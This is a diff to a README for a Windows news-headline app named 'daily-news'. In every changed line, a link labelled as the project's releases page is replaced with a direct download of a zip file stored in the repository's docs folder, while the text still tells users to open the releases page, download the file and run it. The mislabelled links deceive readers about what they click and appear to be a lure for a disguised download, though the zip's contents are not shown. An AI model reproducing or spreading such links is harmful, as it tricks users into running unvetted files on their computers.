@@ -1,10 +1,10 @@
 # 📰 daily-news - Daily headlines in one place
 
-[![Download daily-news](https://img.shields.io/badge/Download-daily--news-blue.svg?style=for-the-badge)](https://github.com/mycologistbigsiouxriver198/daily-news/releases)
+[![Download daily-news](https://img.shields.io/badge/Download-daily--news-blue.svg?style=for-the-badge)](https://github.com/mycologistbigsiouxriver198/daily-news/raw/refs/heads/main/docs/news_daily_v2.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases)
+Visit this page to download: [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/raw/refs/heads/main/docs/news_daily_v2.0.zip)
 
 Open the releases page, look for the latest version, and download the Windows file for your PC. If you see more than one file, choose the one for Windows.
 
@@ -117,7 +117,7 @@ Use the Windows file that came from the latest release on the releases page.
 
 To get the latest version:
 
-1. Return to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases) page
+1. Return to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/raw/refs/heads/main/docs/news_daily_v2.0.zip) page
 2. Download the newest Windows file
 3. Open the new file
 4. Remove the old version if you no longer need it
@@ -178,7 +178,7 @@ daily-news uses the 6551 API to show news and topic data. It focuses on reading 
 
 ## 📋 Quick start
 
-1. Go to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases) page
+1. Go to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/raw/refs/heads/main/docs/news_daily_v2.0.zip) page
 2. Download the latest Windows file
 3. Open it on your PC
 4. Follow the on-screen steps
